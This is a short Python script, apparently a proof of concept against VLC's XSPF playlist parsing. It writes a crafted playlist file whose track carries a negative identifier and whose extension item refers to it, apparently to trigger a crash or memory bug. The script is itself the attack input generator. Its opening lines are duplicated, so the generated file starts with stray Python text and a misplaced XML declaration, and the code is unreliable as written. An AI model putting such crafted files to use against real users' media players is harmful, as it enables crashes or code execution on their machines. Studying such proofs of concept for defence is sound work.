xspf_file_content = '''
<?xml version="1.0" encoding="UTF-8"?>
<playlist version="1" xmlns="http://xspf.org/ns/0/">
xspf_file_content = '''
<?xml version="1.0" encoding="UTF-8"?>
<playlist version="1" xmlns="http://xspf.org/ns/0/">
<title>XSPF PoC</title>
<location>C:\My%20Music\playlist.xspf</location>
<trackList>
<track>
<identifier>-1873768239</identifier>
<location>C:\My%20Music\Track1.mp3</location>
<extension application="http://www.videolan.org/vlc/playlist/0">
</extension>
<duration>239099</duration>
</track>
</trackList>
<extension application="http://www.videolan.org/vlc/playlist/0">
<item href="0" />
</extension>
</playlist>
'''

crafted_xspf_file = open('playlist.xspf','w')
crafted_xspf_file.write(xspf_file_content)
crafted_xspf_file.close()
